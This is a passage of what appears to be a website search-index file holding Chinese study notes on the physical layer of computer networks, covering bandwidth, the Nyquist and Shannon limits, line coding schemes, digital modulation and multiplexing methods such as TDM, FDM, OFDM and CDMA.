<p>\u7269\u7406\u5c42\u662f\u5b9e\u9645\u6570\u636e\u4fe1\u53f7\u4f20\u8f93\u7684\u5c42\uff0c\u6211\u4eec\u9700\u8981\u4f20\u8f93\u7684\u4fe1\u606f\u603b\u662f\u504f\u5411\u81ea\u7136\u8bed\u8a00\u7684\uff0c\u4f46\u662f\u7269\u7406\u5c42\u5185\u90e8\u7684\u6570\u636e\u4fe1\u53f7\u5df2\u7ecf\u88ab\u5904\u7406\u6210\u4e86\u6613\u4e8e\u4f20\u64ad\u7684\u5f62\u5f0f</p> <p>\u7269\u7406\u5c42\u5b9e\u9645\u7ba1\u7406\u4e86\u6570\u636e\u4f20\u8f93\u7684\u4ecb\u8d28\uff0c\u6bd4\u5982\u5149\u7ea4\uff0c\u65e0\u7ebf\u4fe1\u53f7\u7b49\u7b49\uff0c\u540c\u65f6\u5b83\u9700\u8981\u5bf9\u94fe\u8def\u5c42\u5f62\u6210\u62bd\u8c61\uff0c\u5bf9\u94fe\u8def\u5c42\u662f\u4e0d\u77e5\u9053\u6570\u636e\u4ee5\u4ec0\u4e48\u4ecb\u8d28\u4f20\u8f93\u7684\u3002\u7269\u7406\u5c42\u786e\u5b9a\u4e86\u4f20\u8f93\u5a92\u4f53\u6709\u5173\u7684\u7279\u8d28\uff0c\u8fdb\u884c\u7ea6\u5b9a</p> <ul> <li>\u673a\u68b0\u7279\u6027 \u7535\u8def\u63a5\u53e3\u5f62\u72b6\uff0c\u5c3a\u5bf8\uff0c\u5f15\u811a\u7b49\u7b49</li> <li>\u7535\u6c14\u7279\u6027 \u7535\u538b\u8303\u56f4\uff0c\u4f20\u8f93\u901f\u7387\u548c\u8ddd\u79bb\u9650\u5236</li> <li>\u529f\u80fd\u7279\u6027 \u7535\u538b\u610f\u4e49\uff0c\u6bcf\u6761\u7ebf\u7684\u529f\u80fd</li> <li>\u8fc7\u7a0b\u7279\u6027 \u5de5\u4f5c\u987a\u5e8f\u548c\u65f6\u5e8f</li> </ul> <p>\u6570\u636e\u662f\u4f20\u8f93\u7684\u4fe1\u606f\uff0c\u4fe1\u53f7\u662f\u6570\u636e\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u7684\u5f62\u5f0f</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#1","title":"1. \u4e00\u4e9b\u6982\u5ff5\u7684\u5b9a\u4e49","text":"<p>\u4e00\u822c\u5728\u8ba1\u7f51\u4e2d b \u4e3a bit \u800c B \u4e3a byte</p> <ul> <li>link \u7269\u7406\u4e0a\u7684\u94fe\u8def</li> <li>channel \u903b\u8f91\u4e0a\u7684\u94fe\u8def</li> <li>data rate / bit rate \u5355\u4f4d\u65f6\u95f4\u5185\u4f20\u8f93\u7684\u4fe1\u606f\u4e2d\u7684 bit \u6570\u91cf\uff0c\u7279\u6307\u6709\u6548bit\uff0c\u5355\u4f4d\u4e3a kb/s \u6bcf\u79d2\u591a\u5c11kb</li> <li>symbol rate / baud rate \u5355\u4f4d\u65f6\u95f4\u5185\u4f20\u8f93\u7684 symbol \u6570\u91cf\uff0c\u4e5f\u5c31\u662f\u53ef\u80fd\u53d1\u751f\u7684\u4fe1\u53f7\u53d8\u5316\u6b21\u6570</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#11","title":"1.1 \u5e26\u5bbd","text":"<p>\u8c10\u6ce2\u62df\u5408\u65b9\u6ce2\uff0c\u6211\u4eec\u8981\u4f20\u8f93\u7684\u6570\u636e\u5f80\u5f80\u662f\u4e8c\u8fdb\u5236\u7684\uff0c\u800c\u4e8c\u8fdb\u5236\u5728\u6ce2\u5f62\u4e0a\u5c31\u8868\u73b0\u4e3a\u65b9\u6ce2\uff0c\u540c\u65f6\u6211\u4eec\u53ef\u4ee5\u7528\u8c10\u6ce2\u53bb\u62df\u5408\u4e00\u4e2a\u65b9\u6ce2\uff0c\u539f\u7406\u4e0a\u5c31\u662f\u505a\u5085\u91cc\u53f6\u5c55\u5f00\u3002</p> <p>\u57fa\u4e8e\u4e0a\u8ff0\u77e5\u8bc6\uff0c\u6211\u4eec\u518d\u6765\u770b\u4e00\u4e9b\u6982\u5ff5</p> <ul> <li>\u6a21\u62df\u5e26\u5bbd / \u622a\u6b62\u9891\u7387 \\(f_c\\) (analog bandwidth) \u8fd9\u662f\u7269\u7406\u4ecb\u8d28\u7684\u5c5e\u6027\uff0c\u5f53\u4f20\u8f93\u9891\u7387\u5927\u4e8e\u8be5\u7269\u7406\u4ecb\u8d28 \\(f_c\\) \u7684\u4fe1\u53f7\u65f6\uff0c\u4f1a\u53d1\u751f\u4e25\u91cd\u7684\u8870\u51cf\uff0c\u56e0\u6b64\u9700\u8981\u63a7\u5236\u4fe1\u53f7\u7684\u9891\u7387</li> <li>\\(0 \\sim f_c\\) \u79f0\u4e3a\u8be5\u4ecb\u8d28\u7684\u5e26\u5bbd</li> </ul> <p>\u5047\u8bbe\u6211\u4eecdata rate\u662fr\uff0c\u9700\u8981\u4f20\u8f93b bit\u7684\u4fe1\u53f7\uff0c\u90a3\u4e48\u5468\u671f\u5c31\u662f b / r \u800c \u9891\u7387\u5c31\u662f r / b\u3002\u7136\u540e\u6211\u4eec\u77e5\u9053\u6211\u4eec\u7684\u4ecb\u8d28\u6709\u622a\u6b62\u9891\u7387\uff0c\u5f53\u6211\u4eec\u7528N\u7684\u8c10\u6ce2\u53bb\u62df\u5408\u7684\u65f6\u5019\uff0c\u9700\u8981\u6ee1\u8db3</p> \\[ N*\\frac{r}{b}\\leq f_c \\] \\[ N\\leq \\frac{b*f_c}r{} \\] <p>\u56e0\u4e3a\u4fe1\u53f7\u91cf\u548c\u622a\u6b62\u9891\u7387\u90fd\u662f\u56fa\u5b9a\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u77e5\u9053N\u548cr\u6210\u53cd\u6bd4\uff0c\u8c10\u6ce2\u7684\u6570\u91cf\u8868\u793a\u4e86\u4fe1\u53f7\u7684\u8d28\u91cf\u800cdate rate\u8868\u793a\u4e86\u4fe1\u53f7\u7684\u4f20\u8f93\u7387\u3002\u6211\u4eec\u4e00\u822c\u9700\u8981\u56fa\u5b9aN\u4ee5\u4fdd\u8bc1\u4e00\u5b9a\u7684\u4f20\u8f93\u8d28\u91cf\uff0c\u56e0\u6b64\u6211\u4eec\u5f80\u5f80\u4f1a\u53d1\u73b0 \\(f_c\\) \u8d8a\u9ad8\uff0cdata rate \u5c31\u8d8a\u9ad8\uff0c\u5728\u5386\u53f2\u4e0a\u6211\u4eec\u4e5f\u5c06 data rate \u7684\u6700\u5927\u503c\u79f0\u4e3a\u5e26\u5bbd</p> <p>\u5b9e\u9645\u4e0a\uff0c\u4ecb\u8d28\u7684\u5e26\u5bbd\u8868\u8ff0\u7684\u662f\u4e00\u4e2a\u533a\u95f4\uff0c\u5e76\u4e0d\u4e00\u5b9a\u662f\u4ece0\u5f00\u59cb\uff0c\u5bf9\u4e00\u4e2a\u4ecb\u8d28\u800c\u8a00 \\(0\\sim B\\ Hz\\)\u7684\u4fe1\u53f7\u88ab\u79f0\u4e3a\u57fa\u5e26\u4fe1\u53f7 baseband signal \u800c \\(S\\sim S+B \\ Hz\\)\u7684\u578b\u53f7\u79f0\u4e3a passband signal</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#12","title":"1.2 \u7801\u5143","text":"<p>\u7801\u5143/\u7b26\u53f7 symbol</p> <p>\u7528\u4e00\u4e2a\u6570\u5b57\u8109\u51b2\u8868\u793a\u7684\u4e00\u4e2a k \u8fdb\u5236\u7684\u6570\u5b57</p> <p>\u5728\u5b8f\u89c2\u5c42\u9762\u4e0a\uff0c\u4e00\u4e2a\u6570\u5b57\u8109\u51b2\u5c31\u662f\u8868\u793a 0 \u548c 1\uff0c\u4f46\u662f\u5728\u5b9e\u9645\u4f20\u8f93\u548c\u91c7\u6837\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4e00\u4e2a\u6570\u5b57\u8109\u51b2\u53ef\u80fd\u4f1a\u88ab\u591a\u4f4d\u6570\u5b57\u8868\u793a\uff0c\u4f8b\u5982\u6211\u4eec\u53ef\u80fd\u8868\u793a\u4e3a\uff08\u4f4e\uff0c\u4e2d\u4f4e\uff0c\u4e2d\u9ad8\uff0c\u9ad8\uff09\uff0c\u5c31\u9700\u89814\u8fdb\u5236\uff0c\u4e5f\u5c31\u67090 1 2 3\u56db\u79cd\u53ef\u80fd</p> <p>symbol rate / baud rate</p> <p>\u5355\u4f4d\u65f6\u95f4\u5185\u4f20\u8f93 symbol \u6570\u91cf\uff0c\u4e5f\u5373\u5355\u4f4d\u65f6\u95f4\u5185\u53ef\u80fd\u53d1\u751f\u7684\u4fe1\u53f7\u53d8\u5316\u6b21\u6570</p> <p>\u4f9d\u65e7\u4ee5\u4e0a\u8ff0 4 \u8fdb\u5236\u7801\u5143\u4e3a\u4f8b\uff0c4\u8fdb\u5236\u7801\u5143\u9700\u89812bit\u7684\u6570\u636e\u6765\u63cf\u8ff0\uff0c\u82e5 64 kb/s  \u7684 data rate\uff0csymbol rate \u5c31\u662f 32 kbaud</p> <p>Nyquist's theorem</p> <p>\u4e5f\u79f0\u4e3a\u91c7\u6837\u5b9a\u7406\uff0c\u5728\u7406\u60f3\u4f4e\u901a\u7684\u4fe1\u9053\uff08\u65e0\u566a\u58f0\uff0c\u5e26\u5bbd\u6709\u9650\uff09\u4e2d\uff0c\u6781\u9650\u7801\u5143\u7684\u4f20\u8f93\u901f\u7387\u662f\u4e24\u500d\u5e26\u5bbd\uff0c\u8d85\u8fc7\u4e24\u500d\u5e26\u5bbd\u7684\u91c7\u6837\u4e5f\u65e0\u6cd5\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\u6700\u5927\u7684 symbol rate \u662f 2W\uff0c\u6700\u5927\u7684data rate \u5c31\u662f \\(2W*\\log_2(V)\\) \u5176\u4e2dV\u5c31\u662f\u7801\u5143\u7684V\u8fdb\u5236\uff0c\u4e00\u4e2alog\u5c31\u5c06\u8fdb\u5236\u8f6c\u6362\u6210bit\u6570\u91cf</p> <p>Shannon's theorem</p> <p>\u5728\u53d7\u5230\u9ad8\u65af\u767d\u566a\u58f0\u5e72\u6270\u7684\u4f4e\u901a\u4fe1\u901a\u9053\u4e2d\uff0c\u7528W\u8868\u793a\u4fe1\u9053\u7684\u5e26\u5bbd\uff0cS\u8868\u793a\u4fe1\u53f7\u5e73\u5747\u529f\u7387\uff0cN\u8868\u793a\u9ad8\u65af\u566a\u58f0\u529f\u7387\uff0c\u5219\u6700\u5927\u7684 data rate \u4e3a \\(W\\log_2(1+S/N)\\) </p> <p>SNR</p> <p>\u4fe1\u566a\u6bd4 \u5c31\u662f\u4e0a\u8ff0\u516c\u5f0f\u4e2d\u7684 S / N \u5355\u4f4d\u4e3adB\uff0c\u4f8b\u5982 30 dB \u8868\u793a\u7684 \\(10^3\\)\uff0c\u5982\u679c\u7ed9\u7684\u662fSNR\u7684\u8bdd\uff0c\u8981\u6ce8\u610f\u5355\u4f4d dB \u9700\u8981\u505a\u8fdb\u4e00\u6b65\u8f6c\u6362</p> <p>\u4e0a\u8ff0\u4e24\u4e2a\u5b9a\u7406\u90fd\u662f\u9650\u5236\u6781\u9650\u6570\u636e\u7387\uff0c\u6709\u566a\u58f0\u6709\u4e24\u4e2a\u9650\u5236\uff0c\u53d6\u6700\u5c0f\uff0c\u65e0\u566a\u58f0\u53ea\u6709\u7b2c\u4e00\u4e2a\u9650\u5236</p> <p>\u6709\u5982\u4e0b\u4f8b\u9898</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#2","title":"2. \u4fe1\u606f\u4ea4\u4e92\u65b9\u5f0f","text":"<ul> <li>\u5355\u5de5\u94fe\u8def simplex link \u53ea\u67091\u6761\u4fe1\u9053\uff0c\u56fa\u5b9a\u5355\u5411\u901a\u4fe1</li> <li>\u534a\u53cc\u5de5\u94fe\u8def half-deplex link \u67092\u6761\u4fe1\u9053\uff0c\u53ef\u4ee5\u53cc\u5411\u901a\u4fe1\u4f46\u662f\u4e0d\u80fd\u540c\u65f6</li> <li>\u5168\u53cc\u5de5\u94fe\u8def full-duplex link \u67092\u6761\u4fe1\u9053\uff0c\u53ef\u4ee5\u540c\u65f6\u6536\u53d1</li> </ul> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c2 channels \u5e76\u4e0d\u610f\u5473\u7740\u9700\u8981\u4e24\u4e2a\u7269\u7406\u94fe\u8def\uff0c\u4e00\u4e2a\u94fe\u8def\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e9b\u590d\u7528\u65b9\u5f0f\u5b9e\u73b0\u53cc\u5411\u4f20\u8f93</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#3","title":"3. \u4f20\u8f93\u4ecb\u8d28 / \u4f20\u8f93\u5a92\u4f53","text":"<p>\u4f3c\u4e4e\u4e0d\u592a\u4f1a\u8003</p> <p>Transmission media\uff1a\u6570\u636e\u4f20\u8f93\u7cfb\u7edf\u4e2d\u53d1\u9001\u548c\u63a5\u53d7\u8bbe\u5907\u4e4b\u95f4\u7684\u7269\u7406\u901a\u8def</p> <p>\u6709\u4e24\u79cd\u5206\u7c7b</p> <p>\u5bfc\u5411\u4f20\u8f93\u4ecb\u8d28 Guided transmission media</p> <ul> <li>\u78c1\u4ecb\u8d28</li> <li> <p>\u53cc\u7ede\u7ebf twisted pair</p> </li> <li> <p>\u7ede\u5408\u7684\u76ee\u7684\u662f\u51cf\u5c11\u76f8\u90bb\u5bfc\u7ebf\u7684\u7535\u78c1\u5e72\u6270</p> </li> <li>\u5728\u5176\u5916\u52a0\u4e00\u5c42\u91d1\u5c5e\u4e1d\u7f16\u7ec7\u7684\u5c4f\u853d\u5c42\uff0c\u53ef\u4ee5\u8fdb\u4e00\u6b65\u63d0\u9ad8\u6297\u7535\u78c1\u5e72\u6270\u80fd\u529b\uff0c\u79f0\u4e3a\u5c4f\u853d\u53cc\u7ede\u7ebf STP Shielded Twisted Pair</li> <li>\u53cd\u4e4b\u79f0\u4e3a\u975e\u5c4f\u853d\u53cc\u7ede\u7ebf UTP Unshielded Twisted Pair</li> <li>\u540c\u8f74\u7535\u7f06 coaxial cable</li> <li>\u5149\u7ea4 fiber optics</li> </ul> <p>\u975e\u5bfc\u5411\u4f20\u8f93\u4ecb\u8d28 Wireless transmission</p> <p>\u5176\u5b9e\u5c31\u662f\u65e0\u7ebf\u4f20\u8f93</p> <ul> <li> <p>\u65e0\u7ebf\u7535\u6ce2 Radio</p> </li> <li> <p>\u6709\u8f83\u5f3a\u7684\u7a7f\u900f\u80fd\u529b\uff0c\u4e0d\u9700\u8981\u5bf9\u51c6\u67d0\u4e2a\u65b9\u5411\uff0c\u4f8b\u5982\u65e0\u7ebf\u624b\u673a\u901a\u4fe1 WLAN\uff08wireless local area network\uff09</p> </li> <li>\u6709\u5f88\u5f3a\u7684\u65b9\u5411\u6027\uff0c\u76f4\u7ebf\u4f20\u64ad\uff0c\u4f8b\u5982\u5fae\u6ce2\uff0c\u7ea2\u5916\u7ebf\uff0c\u6fc0\u5149</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#4","title":"4. \u6570\u5b57\u8c03\u5236","text":"<p>\u6570\u5b57\u8c03\u5236 digital modulation \u662f\u6307\u6570\u636e\u548c\u4ee3\u8868\u5b83\u4eec\u7684\u4fe1\u53f7\u4e4b\u95f4\u7684\u8f6c\u6362\u8fc7\u7a0b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#41-baseband-transmission","title":"4.1 \u57fa\u5e26\u4f20\u8f93 baseband transmission","text":"<p>\u5176\u672c\u8d28\u662f\u5bf9\u6bd4\u7279\u6d41\u7684\u7f16\u7801\uff0c\u5176\u5b9e\u548c\u8c03\u5236\u4e0d\u7b97\u5173\u7cfb\u5bc6\u5207\u3002</p> <p>\u5176\u76f4\u63a5\u5c06\u6570\u636e\u8f6c\u6362\u6210\u6570\u5b57\u4fe1\u53f7\uff0c\u672c\u8eab\u53d1\u9001 0 1 \u65b9\u6ce2\u662f\u4e0d\u53ef\u884c\u7684\uff0c\u5176\u5c55\u5f00\u540e\u9891\u7387\u4e3a\u65e0\u9650\u5927\uff0c\u57fa\u5e26\u4f20\u8f93\u7684\u9009\u62e9\u662f\u5c06\u65e0\u6cd5\u53d1\u9001\u7684\u90a3\u90e8\u5206\u76f4\u63a5\u4f7f\u5176\u5931\u771f\u3002</p> <p>\u5176\u7528\u4e8e\u6709\u7ebf\u4ecb\u8d28\uff08\u5149\u7ea4\u4e0d\u662f\u57fa\u5e26\u4f20\u8f93\uff09</p> <p>\u7f16\u7801\u5f62\u5f0f</p> <ul> <li>Non-Return to Zero \uff08NRZ\uff09\u76f4\u63a5\u5c06Bit Stream\u8f6c\u6362\u6210\u9ad8\u4f4e\u7535\u9891</li> </ul> <p>\u200b\u200b</p> <ul> <li>Manchester\uff08\u4ee5\u592a\u7f51\u4f7f\u7528\u7684\uff09 \u5c06\u8981\u53d1\u9001\u7684Bit Stream\u548c\u65f6\u949f\u9891\u7387\uff08\u4e00\u4e2a\u5468\u671f\u5185\u5148\u4f4e\u540e\u9ad8\uff09\u505a\u5f02\u6216\u3002\u89e3\u51b3\u4e86\u4e00\u4e2a\u95ee\u9898\u5c31\u662f\u63a5\u53d7\u548c\u53d1\u9001\u65b9\u91c7\u6837\u9891\u7387\u4e0d\u4e00\u81f4\u7684\u95ee\u9898\uff0c\u6bd4\u5982\u6211\u4eec\u8fde\u53d1\u4e86 10 \u4e2a\u9ad8\u7535\u9891\uff0c\u5982\u4f55\u770b\u51fa\u8fd9\u662f\u51e0\u4e2a\u9ad8\u7535\u9891</li> <li>\u4f20\u8f931\u7684\u65f6\u5019\u4e0b\u964d \u4f20\u8f930\u7684\u65f6\u5019\u4e0a\u5347</li> <li>\u4f46\u662f\u5176\u7f3a\u70b9\u5728\u4e8e\u964d\u4f4e\u4e86\u7f16\u7801\u6548\u7387\uff0c\u964d\u4f4e\u4e86\u4e00\u534a\u7684\u6709\u6548\u53d1\u9001</li> </ul> <p>\u200b\u200b</p> <ul> <li>NRZ invert \uff08NRZI\uff09\uff08USB2.0 \u4f7f\u7528\uff09\uff0c\u76f8\u5f53\u4e8e\u89e3\u51b3\u4e00\u534a\u95ee\u9898\uff0c\u5176\u7f16\u7801\u539f\u5219\u662f\uff0c1\u7684\u65f6\u5019\u8f6c\u53d8\u9ad8\u4f4e\u7535\u9891\uff0c0\u7684\u65f6\u5019\u4e0d\u53d8\uff0c\u90a3\u4e481\u7684\u53d1\u9001\u53ef\u4ee5\u89e3\u51b3\uff0c\u800c\u8fde\u7eed\u76840\u7684\u53d1\u9001\u4f9d\u65e7\u65e0\u6cd5\u89e3\u51b3</li> <li>\u4f46\u662f\u89e3\u51b3\u4e86overhead\u8fc7\u9ad8\u7684\u95ee\u9898</li> <li>\u5b9e\u9645\u4e0a\u7684NRZI\u5b8c\u6210\u4e86\u4e00\u4e2a 4B / 5B \u7684\u6620\u5c04\uff0c\u4f7f\u5f97\u901a\u8fc7\u8fd9\u4e2a\u8868\u7f16\u7801\uff0c\u6700\u591a\u8fde\u7eed\u51fa\u73b0 3 \u4e2a 0 \uff0c\u589e\u52a0\u4e86 25 % \u7684\u5f00\u9500</li> </ul> <p>\u200b\u200b</p> <ul> <li>srambling \u6270\u9891\uff1a\u4e3a\u4e86\u89e3\u51b3\u591a\u4e2a0\u548c\u591a\u4e2a1\u7684\u95ee\u9898\uff0c\u5728\u53d1\u9001\u6570\u636e\u4e4b\u524d\u751f\u6210\u4e00\u4e2a\u4f2a\u968f\u673a\u5e8f\u5217\u4e0e\u5176\u505a\u5f02\u6216\u518d\u53d1\u9001\uff0c\u63a5\u6536\u65b9\u4f1a\u751f\u6210\u76f8\u540c\u7684\u4f2a\u968f\u673a\u5e8f\u5217\u5e76\u7528\u5176\u89e3\u5bc6</li> <li>\u7f3a\u70b9\u662f\u8fd8\u662f\u4e0d\u80fd\u5b8c\u5168\u4fdd\u8bc1\u4e0d\u4f1a\u51fa\u73b0\u957f 0 \u548c \u957f 1\uff0c\u5c24\u5176\u662f\u5e8f\u5217\u8f83\u77ed\u4e4b\u7c7b\u7684\u60c5\u51b5\uff0c\u4e5f\u53ef\u80fd\u88ab\u6076\u610f\u7528\u6237\u653b\u51fb</li> </ul> <p>\u7f16\u7801\u5e73\u8861\u6027</p> <p>\u4e0a\u8ff0\u7684\u7f16\u7801\u5f62\u5f0f\u90fd\u5728\u89e3\u51b3\u5f00\u9500\u548c\u540c\u6b65\u7684\u95ee\u9898\uff0c\u4f46\u8fd8\u6709\u4e00\u4e2a\u5e73\u8861\u6027\u7684\u95ee\u9898\u8981\u89e3\u51b3</p> <ul> <li>Bipolar encoding \uff08AMI\uff09\uff1a0\u8fd8\u662f0\uff0c\u7b2c\u4e00\u4e2a1\u7528+1\uff0c\u7b2c\u4e8c\u4e2a1\u7528-1\uff0c\u5982\u6b64\u5faa\u73af</li> </ul> <p>\u200b\u200b</p> <p>\u6211\u4eec\u5c06\u77ed\u65f6\u95f4\u5185\u6b63\u7535\u538b\u548c\u8d1f\u7535\u538b\u4e00\u6837\u591a\u7684\u4fe1\u53f7\u6210\u4e3a \u5e73\u8861\u4fe1\u53f7 balanced signal, \u6ca1\u6709\u76f4\u6d41\u5206\u91cf\uff0c\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u6709\u5f88\u591a\u4f18\u52bf</p> <p>8B/10B</p> <p>\u8fd9\u4e2a\u7f16\u7801\u65b9\u5f0f\u662f\u6700\u5e73\u8861\u7684\uff0c\u5f00\u9500\u4e3a 25 %\uff0c\u5e76\u4e14\u4fdd\u8bc1\u4e0d\u4f1a\u6709 5 \u4e2a\u8fde\u7eed0\u548c5\u4e2a\u8fde\u7eed1</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#42-passband-transmission","title":"4.2 \u901a\u4ee3\u4f20\u8f93 passband transmission","text":"<p>\u901a\u8fc7\u8c03\u5236\u8f7d\u6ce2\u4fe1\u53f7\u7684\u5e45\u503c\uff0c\u76f8\u4f4d\u548c\u9891\u7387\u6765\u8fd0\u8f7d\u6570\u636e\uff0c\u5360\u636e\u8f7d\u6ce2\u4fe1\u53f7\u9891\u7387\u4e2d\u5fc3\u7684\u4e00\u6bb5\u9891\u5e26\u3002</p> <p>\u7528\u4e8e\u65e0\u7ebf\u548c\u5149\u7ea4\u4fe1\u9053</p> <p>\u200b\u200b</p> <p>\u4e0a\u56fe\u4e2d\u7684 b c d \u5206\u522b\u8868\u793a\u4e0d\u540c\u7684\u8c03\u5236\u65b9\u5f0f</p> <ul> <li>\u5e45\u79fb\u952e\u63a7 ASK Amplitude Shift Keying \u7528\u4e0d\u540c\u7684\u632f\u5e45\u6765\u8868\u793a 0 \u548c 1 \u5982b</li> <li>\u9891\u79fb\u952e\u63a7 FSK Frequency Shift Keying \u7528\u4e0d\u540c\u9891\u7387\u6765\u8868\u793a\u4e0d\u540c\u7801\u5143 \u5982c</li> <li> <p>\u76f8\u79fb\u952e\u63a7 PSK Phase Shift Keying \u5c06\u8f7d\u6ce2\u6ce2\u5f62\u504f\u79fb\u4e00\u5b9a\u7684\u76f8\u4f4d\uff0c\u5982d</p> </li> <li> <p>\u4e8c\u8fdb\u5236\u76f8\u79fb\u952e\u63a7 Binary PSK \u5c06\u6ce2\u5f62\u504f\u79fb 0 \u548c 180 \u5ea6</p> </li> <li>\u6b63\u4ea4\u76f8\u79fb\u952e\u63a7 Quadrature PSK \u5c06\u6ce2\u5f62\u504f\u79fb 45\uff0c135\uff0c225\u548c315\u5ea6</li> </ul> <p>\u4f46\u662f\u4e0a\u8ff0\u8c03\u5236\u65b9\u6cd5\u662f\u53ef\u4ee5\u7ec4\u5408\u7684</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#5","title":"5. \u591a\u8def\u590d\u7528","text":"<p>\u7531\u4e8e\u5f00\u9500\u6210\u672c\u7684\u95ee\u9898\uff0c\u6211\u4eec\u5f80\u5f80\u9700\u8981\u5bf9\u4e00\u6761\u7269\u7406\u94fe\u8def\u5b9e\u73b0\u590d\u7528</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#51-time-division-multiplexing","title":"5.1 \u65f6\u5206\u590d\u7528 Time Division Multiplexing","text":"<p>\u6bcf\u4e2a\u7528\u6237\u5468\u671f\u5730\u8f6e\u6d41\u5de5\u4f5c\uff0c\u5728\u4e00\u4e2a\u6bd4\u8f83\u77ed\u7684\u65f6\u95f4\u7247\u91cc\u83b7\u5f97\u6574\u4e2a\u5e26\u5bbd\uff0c\u7c7b\u4f3c\u4e0e\u9891\u5206\u590d\u7528</p> <p>\u5176\u6709\u53ef\u80fd\u4f1a\u589e\u52a0\u4fdd\u62a4\u65f6\u95f4 guard time \u5c31\u662f\u65f6\u95f4\u7247\u4e0e\u65f6\u95f4\u7247\u4e4b\u95f4\u7684\u95f4\u9694</p> <p>\u200b\u200b</p> <p>TDM\u7684\u8c03\u5ea6\u65b9\u5f0f\u8f83\u4e3a\u673a\u68b0\uff0c\u6211\u4eec\u53ef\u4ee5\u52a8\u6001\u8c03\u6574\u4e3a \u7edf\u8ba1\u65f6\u5206\u590d\u7528 STDM Statistical TDM\uff0c\u6838\u5fc3\u610f\u4e49\u5c31\u5728\u4e8e\u7ed9\u6bd4\u8f83\u5e38\u4f7f\u7528\u7684\u7528\u6237\u591a\u5206\u914d\u51e0\u4e2a\u65f6\u95f4\u7247\uff0c\u4f46\u662f\u9700\u8981\u989d\u5916\u6570\u636e\u505a\u540c\u6b65\uff08\u63a5\u6536\u65b9\u5f97\u77e5\u9053\u662f\u8c01\u53d1\u7684\uff09\uff0c\u6280\u672f\u4e0a\u6bd4\u8f83\u590d\u6742</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#52-frequency-division-multiplexing","title":"5.2 \u9891\u5206\u590d\u7528 Frequency Division Multiplexing","text":"<p>\u6211\u4eec\u4e4b\u524d\u63d0\u5230\u4fe1\u9053\u6709\u5e26\u5bbd\uff0c\u5e26\u5bbd\u7684\u57fa\u9891\u662f\u53ef\u4ee5\u79fb\u52a8\u7684\uff0c\u90a3\u4e48\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u628a\u4e00\u4e2a\u94fe\u8def\u6309\u7167\u9891\u7387\u5206\u6210\u51e0\u4e2a\u9891\u5e26\uff0c\u8981\u6c42\u8fd9\u51e0\u4e2a\u9891\u5e26\u4e4b\u95f4\u4e92\u4e0d\u5e72\u6270\u5373\u53ef</p> <p>\u8981\u6c42\u662f\u6bcf\u4e2a\u9891\u5e26\u4e4b\u95f4\u8981\u7559\u51fa\u8db3\u591f\u5bbd\u7684\u8ddd\u79bb\uff0c\u4fdd\u8bc1\u5176\u4e0d\u4f1a\u91cd\u53e0\uff0c\u8fd9\u90e8\u5206\u4fdd\u62a4\u95f4\u9694\u6210\u4e3a \u4fdd\u62a4\u9891\u5e26 guard band</p> <p>\u200b\u200b</p> <p>\u6b63\u4ea4\u9891\u5206\u590d\u7528 OFDM Orthogonal FDM</p> <p>\u6bcf\u4e2a\u5b50\u8f7d\u6ce2\u662f\u6b63\u4ea4\u7684\uff0c\u6bcf\u4e2a\u5b50\u8f7d\u6ce2\u5728\u5176\u4ed6\u5b50\u8f7d\u6ce2\u7684\u4e2d\u5fc3\u7684\u80fd\u91cf\u4e3a0\uff0c\u53ea\u9700\u8981\u6211\u4eec\u505a\u5230\u5728\u4e2d\u5fc3\u70b9\u91c7\u6837\uff0c\u6211\u4eec\u5c31\u4e0d\u9700\u8981 guard band\uff0c\u5e76\u4e14\u9891\u5e26\u590d\u7528\u7387\u5f88\u9ad8</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#53","title":"5.3 \u7801\u5206\u590d\u7528","text":"<p>\u7801\u5206\u590d\u7528 CDMA\uff0c\u53ef\u4ee5\u540c\u65f6\u505a\u5230\u5171\u4eab\u4fe1\u53f7\u7684\u9891\u7387\u548c\u65f6\u95f4\uff0c\u5c06\u6bcf\u4e2a\u6bd4\u7279\u65f6\u95f4\u5206\u4e3am\u4e2a\u69fd\uff0c\u79f0\u4e3a\u7801\u7247chip</p> <p>\u9996\u5148\u5c06\u6bcf\u4e2a\u7ad9\u70b9\u6307\u5b9a\u4e00\u4e2am\u4f4d\u7684\u7801\u7247\u5e8f\u5217\uff0c\u6240\u6709\u4e0d\u540c\u7ad9\u70b9\u4e4b\u95f4\u7684\u7801\u7247\u5e8f\u5217\u7684\u89c4\u683c\u5316\u5185\u79ef\u4e3a0</p> 